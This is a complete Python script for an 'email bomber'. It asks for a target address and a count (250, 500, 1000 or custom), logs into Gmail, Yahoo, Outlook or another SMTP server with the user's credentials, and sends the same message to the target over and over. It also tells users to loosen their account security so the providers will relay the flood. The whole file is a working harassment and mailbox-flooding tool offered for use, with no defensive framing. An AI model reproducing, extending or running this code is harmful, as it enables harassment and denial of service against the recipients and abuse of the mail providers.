import smtplib, sys

print("If you are using a GMAIL or YAHOO account, you will need to change the settings to\n"'Less Secure Apps'" to allow python to send email using there servers,\n also may need to do that for OUTLOOK, or anyother EMAIL SERVER you use.... You may have to check.")
print()
class Email_Bomber:
    count = 0

    def __init__(self):
        try:
            self.target = str(input('Enter target email <: '))
            self.mode = int(input('Enter BOMB mode (1,2,3,4) || 1:(1000) 2:(500) 3:(250) 4:(custom) <: '))
            if int(self.mode) > int(4) or int(self.mode) < int(1):
                print('ERROR: Invalid Option. GoodBye.')
                sys.exit(1)
        except Exception as e:
            print(f'ERROR: {e}')

    def bomb(self):
        try:
            print()
            self.amount = None
            if self.mode == int(1):
                self.amount = int(1000)
            elif self.mode == int(2):
                self.amount = int(500)
            elif self.mode == int(3):
                self.amount = int(250)
            else:
                self.amount = int(input('Choose a CUSTOM amount <: '))
            print(f'\n You have selected BOMB mode: {self.mode} and {self.amount} emails ')
        except Exception as e:
            print(f'ERROR: {e}')

    def email(self):
        try:
            print()
            self.server = str(input('Enter email server | or select premade options - 1:Gmail 2:Yahoo 3:Outlook <: '))
            premade = ['1', '2', '3']
            default_port = True
            if self.server not in premade:
                default_port = False
                self.port = int(input('Enter port number <: '))

            if default_port == True:
                self.port = int(587)

            if self.server == '1':
                self.server = 'smtp.gmail.com'
            elif self.server == '2':
                self.server = 'smtp.mail.yahoo.com'
            elif self.server == '3':
                self.server = 'smtp-mail.outlook.com'

            self.fromAddr = str(input('Enter from address <: '))
            self.fromPwd = str(input('Enter from password <: '))
            self.subject = str(input('Enter subject <: '))
            self.message = str(input('Enter message <: '))

            self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
            ''' % (self.fromAddr, self.target, self.subject, self.message)

            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.fromAddr, self.fromPwd)
        except Exception as e:
            print(f'ERROR: {e}')

    def send(self):
        try:
            self.s.sendmail(self.fromAddr, self.target, self.msg)
            self.count +=1
            print(f'BOMB: {self.count}')
        except Exception as e:
            print(f'ERROR: {e}')

    def attack(self):
        print('\n Bomb Starting')
        for email in range(self.amount+1):
            self.send()
        self.s.close()
        print('\nfinished!')
        sys.exit(0)


if __name__=='__main__':
    bomb = Email_Bomber()
    bomb.bomb()
    bomb.email()
    bomb.attack()
